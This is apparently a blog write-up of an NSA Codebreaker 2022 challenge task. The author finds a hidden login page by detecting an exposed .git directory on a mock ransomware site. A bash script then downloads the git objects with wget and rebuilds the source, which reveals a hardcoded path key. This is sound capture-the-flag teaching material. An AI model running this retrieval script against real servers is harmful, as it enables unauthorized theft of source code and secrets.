---
title: "NSACodebreaker2022 - TaskB2"
topic: "general"
tags: ["web-hacking", "git-hacking"]
prev: "http://andrewromans.com/posts/nsacodebreaker2022-taskb1"
next: "http://andrewromans.com/posts/nsacodebreaker2022-task5"
date: 2022-12-20T11:37:37-05:03
---

# Table of Contents
1. [Task A1](http://andrewromans.com/posts/nsacodebreaker2022-taska1)
2. [Task A2](http://andrewromans.com/posts/nsacodebreaker2022-taska2)
3. [Task B1](http://andrewromans.com/posts/nsacodebreaker2022-taskb1/)
4. [Task B2](#task-b2)
	- [Solution](#solution)
5. [Task 5](http://andrewromans.com/posts/nsacodebreaker2022-task5/)
6. [Task 6](http://andrewromans.com/posts/nsacodebreaker2022-task6/)
7. [Task 7](http://andrewromans.com/posts/nsacodebreaker2022-task7/)
8. [Task 8](http://andrewromans.com/posts/nsacodebreaker2022-task8/)
9. [Task 9](http://andrewromans.com/posts/nsacodebreaker2022-task9/)

## Task B2

- - -
###### It looks like the backend site you discovered has some security features to prevent you from snooping. They must have hidden the login page away somewhere hard to guess.

###### Analyze the backend site, and find the URL to the login page.

###### Hint: this group seems a bit sloppy. They might be exposing more than they intend to.
- - -

### Solution

Now that we have the backend site, we can see there are security features in place to prevent external entities from snooping around. We can also assume that there has to be a login page somewhere hidden away. One of our hints is that the group is sloppy, which means they might have left something out in the open that they shouldn't have. 

External from the story line we are following, unfortunately, enumerating the website automatically with tools like DirBuster is not an option. The website is being hosted by AWS which has DDoS prevention measures - and if we want to move onto Task 5, getting blocked is not an option. 

With a little manually digging, we can see there isn't any source code to capture from the web page. However, looking at the network traffic reveals our foothold. Within the headers of an HTTP response is the following flag:

```
x-git-commit-hash: cfab8a76878e4768fb38b424b6ed2af98ac88761
```

This reveals that the web page must be a github repository! Taking the hash and throwing it into Github provides a handful of options, however, none of which is anything worth noting or relevant to a `ransomware-as-a-service` ring's website. Doesn't look like the repository is public.

To move forward, we need to understand how a git repository works. When you initialize a project, or clone a project that is already well developed, there is a private folder that acts as the fundamental roots of the git tree. Without it, git doesn't function. Which means, the web server must have one if it is a git repository - and being that the group is sloppy, maybe they forgot to block access to the repository externally. 

Throwing the following url into our web browser:

```
https://zgoxzopogsqkolvv.ransommethis.net/.git/
```

gives us "Directory listing is not permitted for this directory". 

This is a great error! It might seem bad because we don't have access to seeing the files in this directory, this error tells us that this directory exists and that we have access to it after all! To further test this theory, lets see if we can download a file. Since .git is a well structured folder, we know that the file structures will be similar across all git repositories. One very important file is the `HEAD` file, which lets git know what branch your repository is currently pointing too!

```
https://zgoxzopogsqkolvv.ransommethis.net/.git/HEAD
```

Throwing the above link into the web browser quickly downloads the file to our downloads folder! Or on some browsers asks if you want to install the file you've queried! As suspected, we officially have access to the `.git` folder, which luckily for us is a very powerful foothold. With this power at our fingertips, we can single handedly replicate the repository and analyze the source code to discover where the login page is located.

To do this, we need to understand how git stores data! I won't go too into depth on how git achieves this, however it is ingenious and if you don't already know I recommend doing some research on it. There are tons of resources online and it is a great read for anyone who loves technology, especially for users who use git everyday and take it for granted :) 

However, a brief overview is that git stores objects as `blobs` which are identified by the files hash and stored in the `.git/objects` directory. Git also uses what are called `tree objects` for storing `blobs` and other files/folders. Similarly to how `blobs` work, git identifies `trees` by their hash (which is generated from its content layout). Any new files, file changes, or anything else that adjusts the content of files triggers the creation of an entirely new `tree` object.

Lastly, there is one last file that is relatively important to understand before moving onto my solution. The `index` file is a binary that contains a list of path names, permissions, and hashes of blob objects in the project. This is important to see the current `status` of what objects are edited and exist in the project that can later be pushed up by the developer. Commands like `git add`, `git commit`, and `git checkout` all update and make adjustments to the `index` file.

Now with a brief understanding of why the `.git` folder exists, we can create a new directory of our own and manually create a `.git` folder. 

```
mkdir app && cd ./app
git init
```

Then using the power we've recently discovered, we can `wget` all the files we want into our newly created `.git` folder and replace the `HEAD` and `index` files with the ones from the web server. I also grabbed the `config` and `description` files too for completeness sake. 

My `app` directory now should be treated as a git repo, allowing me to run any git commands I desire. One of which I can do is: `git ls-files --stage`, which shows me the contents of the index file as well as their respective hashes. I can also run a `git status` to see what files are edited and deleted since we have yet to grab all the `blobs` from the object folder. 

*output of git ls-files --stage*

```
100755 fc46c46e55ad48869f4b91c2ec8756e92cc01057 0       Dockerfile
100755 dd5520ca788a63f9ac7356a4b06bd01ef708a196 0       Pipfile
100644 47709845a9b086333ee3f470a102befdd91f548a 0       Pipfile.lock
100755 e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 0       app/__init__.py
100644 dc50d7a866d4c0608506bf049ac504a76551075b 0       app/server.py
100755 a844f894a3ab80a4850252a81d71524f53f6a384 0       app/templates/404.html
100644 1df0934819e5dcf59ddf7533f9dc6628f7cdcd25 0       app/templates/admin.html
100644 b9cfd98da0ac95115b1e68967504bd25bd90dc5c 0       app/templates/admininvalid.html
100644 bb830d20f197ee12c20e2e9f75a71e677c983fcd 0       app/templates/adminlist.html
100644 5033b3048b6f351df164bae9c7760c32ee7bc00f 0       app/templates/base.html
100644 10917973126c691eae343b530a5b34df28d18b4f 0       app/templates/forum.html
100644 fe3dcf0ca99da401e093ca614e9dcfc257276530 0       app/templates/home.html
100644 779717af2447e24285059c91854bc61e82f6efa8 0       app/templates/lock.html
100644 0556cd1e1f584ff5182bbe6b652873c89f4ccf23 0       app/templates/login.html
100644 56e0fe4a885b1e4eb66cda5a48ccdb85180c5eb3 0       app/templates/navbar.html
100755 ed1f5ed5bc5c8655d40da77a6cfbaed9d2a1e7fe 0       app/templates/unauthorized.html
100644 c980bf6f5591c4ad404088a6004b69c412f0fb8f 0       app/templates/unlock.html
100644 470d7db1c7dcfa3f36b0a16f2a9eec2aa124407a 0       app/templates/userinfo.html
100644 48847a686dddb92c50b91f7fa4693de27e02c67f 0       app/util.py
```

Now that I have access to all the hashes and files, and since we understand how git works and where the `blobs` are being stored - we have all the information we need to grab the files from the web server. However, there are quite a few files and doing so manually would be very tedious. So I wrote a bash script to do it for me instead!

```sh
#!/bin/bash

myArray=()
myArray+=("fc46c46e55ad48869f4b91c2ec8756e92cc01057")
myArray+=("Dockerfile")
myArray+=("dd5520ca788a63f9ac7356a4b06bd01ef708a196")  
myArray+=("Pipfile")
myArray+=("47709845a9b086333ee3f470a102befdd91f548a")        
myArray+=("Pipfile.lock")
myArray+=("e69de29bb2d1d6434b8b29ae775ad8c2e48c5391")        
myArray+=("app/__init__.py")
myArray+=("dc50d7a866d4c0608506bf049ac504a76551075b")        
myArray+=("app/server.py")
myArray+=("a844f894a3ab80a4850252a81d71524f53f6a384")        
myArray+=("app/templates/404.html")
myArray+=("1df0934819e5dcf59ddf7533f9dc6628f7cdcd25")        
myArray+=("app/templates/admin.html")
myArray+=("b9cfd98da0ac95115b1e68967504bd25bd90dc5c")        
myArray+=("app/templates/admininvalid.html")
myArray+=("bb830d20f197ee12c20e2e9f75a71e677c983fcd")        
myArray+=("app/templates/adminlist.html")
myArray+=("5033b3048b6f351df164bae9c7760c32ee7bc00f")        
myArray+=("app/templates/base.html")
myArray+=("10917973126c691eae343b530a5b34df28d18b4f")        
myArray+=("app/templates/forum.html")
myArray+=("fe3dcf0ca99da401e093ca614e9dcfc257276530")        
myArray+=("app/templates/home.html")
myArray+=("779717af2447e24285059c91854bc61e82f6efa8")        
myArray+=("app/templates/lock.html")
myArray+=("0556cd1e1f584ff5182bbe6b652873c89f4ccf23")        
myArray+=("app/templates/login.html")
myArray+=("56e0fe4a885b1e4eb66cda5a48ccdb85180c5eb3")        
myArray+=("app/templates/navbar.html")
myArray+=("ed1f5ed5bc5c8655d40da77a6cfbaed9d2a1e7fe")        
myArray+=("app/templates/unauthorized.html")
myArray+=("c980bf6f5591c4ad404088a6004b69c412f0fb8f")        
myArray+=("app/templates/unlock.html")
myArray+=("470d7db1c7dcfa3f36b0a16f2a9eec2aa124407a")        
myArray+=("app/templates/userinfo.html")
myArray+=("48847a686dddb92c50b91f7fa4693de27e02c67f")        
myArray+=("app/util.py")

for (( i=1; i<${#myArray[@]}; i+=2 )); do 
	t=${myArray[i-1]}
	s=${myArray[i]}

	a=${t:0:2}
	b=${t:2:`echo $t | wc -c`}

	mkdir ./.git/objects/$a
	wget https://zgoxzopogsqkolvv.ransommethis.net/.git/objects/$a/$b -P ./.git/objects/$a/
	git cat-file -p $t > ./$s
	
done
```

Now that we have access to the complete source code, we can analyze the code and find out where the login page is located. 

One aspect that stands out from the `server.py` script is the addition of a hardcoded key that the web server requires before accessing any actual content from the server. Appending this `key` to the url sends us to the `login.html` page!

```python
def expected_pathkey():
	return "aibtrqzgecledjgo"
```

The correct answer:

`https://zgoxzopogsqkolvv.ransommethis.net/aibtrqzgecledjgo`

![Task B2 Badge](/posts/badgeb2.png "Task B2 Badge")

- - -